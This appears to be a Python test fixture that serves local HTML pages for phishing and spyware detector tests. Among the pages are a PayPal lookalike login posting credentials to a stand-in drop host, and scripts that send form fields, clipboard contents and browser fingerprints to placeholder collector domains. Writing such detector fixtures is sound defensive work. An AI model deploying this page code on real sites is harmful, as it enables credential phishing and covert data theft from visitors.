"""Local pages for the phishing and spyware tests. Binds to 127.0.0.1; hostnames ending in .test are mapped to it by the tests."""
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PAGES = {
    "/legit": """<html><head><title>Acme Portal</title></head><body><h1>Acme customer portal</h1>
<form action="/login" method="post"><input name="user" type="email"><input name="pw" type="password"></form></body></html>""",
    "/lookalike": """<html><head><title>PayPal - Log in</title></head><body><img src="/logo.png" alt="PayPal logo"><h1>Log in to PayPal</h1>
<form action="https://collect.drop-host.example/post.php" method="post"><input name="email" type="email"><input name="password" type="password"></form></body></html>""",
    "/ext-form": """<html><head><title>Customer Login</title></head><body><h1>Sign in</h1>
<form action="https://collector.example.net/submit" method="post"><input name="u"><input name="p" type="password"></form></body></html>""",
    "/js-serialize": """<html><head><title>Member area</title></head><body><form id="f"><input name="u"><input name="p" type="password"></form>
<script>
const f = document.getElementById("f");
f.addEventListener("submit", function (e) {
  e.preventDefault();
  const fd = new FormData(f);
  fetch("https://drop.example.org/s", {method: "POST", body: fd});
});
</script></body></html>""",
    "/local-endpoint": """<html><head><title>Member area</title></head><body><form id="f"><input name="u"><input name="p" type="password"></form>
<script>
document.getElementById("f").addEventListener("submit", function (e) {
  e.preventDefault();
  fetch("/collect", {method: "POST", body: new FormData(this)});
});
</script></body></html>""",
    "/brand-only": """<html><head><title>Maybank2u</title></head><body><h1>Maybank</h1><img src="/m.png" alt="Maybank logo"><p>Welcome.</p></body></html>""",
    "/idp": """<html><head><title>Sign in</title></head><body><h1>Sign in</h1>
<form action="https://login.microsoftonline.com/common/oauth2/authorize" method="get"><input name="login" type="email"><input name="p" type="password"></form>
<a href="https://accounts.google.com/o/oauth2/auth">Continue with Google</a></body></html>""",
    "/ambiguous": """<html><head><title>Netflix fan club</title></head><body><form action="/login" method="post"><input name="p" type="password"></form>
<script src="https://static.unknown-cdn.invalid/widget.js"></script></body></html>""",
    "/geo-declared": """<html><head><title>Store locator</title></head><body><p>Find stores near me</p><button id="find">Find</button>
<script>
document.getElementById("find").addEventListener("click", function () {
  navigator.geolocation.getCurrentPosition(function (p) { showMap(p.coords.latitude, p.coords.longitude); });
});
</script></body></html>""",
    "/camera-ref": """<html><head><title>Notes</title></head><body><script>
if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) { console.log("camera supported"); }
</script></body></html>""",
    "/permission": """<html><head><title>Daily digest</title></head><body><p>Our page.</p><script>
Notification.requestPermission();
</script></body></html>""",
    "/clip-flow": """<html><head><title>Utility</title></head><body><p>Hello.</p><script>
navigator.clipboard.readText().then(function (text) {
  fetch("https://collector.example.net/c", {method: "POST", body: text});
});
</script></body></html>""",
    "/analytics": """<html><head><title>Blog</title><script async src="https://www.googletagmanager.com/gtag/js?id=G-TEST"></script></head><body><p>Posts</p><script>
window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-TEST');
</script></body></html>""",
    "/fingerprint": """<html><head><title>Shop</title></head><body><script>
const c = document.createElement("canvas"); const x = c.getContext("2d"); x.fillText("probe", 2, 2);
const fp = c.toDataURL();
const a = new OfflineAudioContext(1, 4410, 44100); a.createOscillator();
const gl = c.getContext("webgl"); gl.getExtension("WEBGL_debug_renderer_info");
const pl = navigator.plugins.length; const cores = navigator.hardwareConcurrency;
fetch("https://fp.example.net/c", {method: "POST", body: JSON.stringify({fp: fp, pl: pl, cores: cores})});
</script></body></html>""",
    "/ext-script": """<html><head><title>Page</title><script src="https://cdn.unknown-host.invalid/lib.js"></script></head><body><p>Hi</p></body></html>""",
    "/obfuscated": """<html><head><title>Page</title></head><body><script>
eval(function(p,a,c,k,e,d){return p}('0 1',2,2,'a|b'.split('|'),0,{}))
</script></body></html>""",
    "/clean": """<html><head><title>Plain page</title></head><body><p>Nothing here.</p></body></html>""",
}
PNG = bytes.fromhex("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d49444154789c6360f8cfc0f01f0005000201a6d2a5f60000000049454e44ae426082")


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.0"

    def log_message(self, *a):
        pass

    def do_GET(self):
        path = self.path.split("?")[0]
        if path in PAGES:
            body, ctype, status = PAGES[path].encode(), "text/html; charset=utf-8", 200
        elif path.endswith(".png"):
            body, ctype, status = PNG, "image/png", 200
        elif path in ("/robots.txt", "/sitemap.xml"):
            body, ctype, status = b"", "text/plain", 404
        else:
            body, ctype, status = b"<html>not found</html>", "text/html", 404
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_POST = do_GET


def start(host="127.0.0.1"):
    server = ThreadingHTTPServer((host, 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, server.server_address[1]
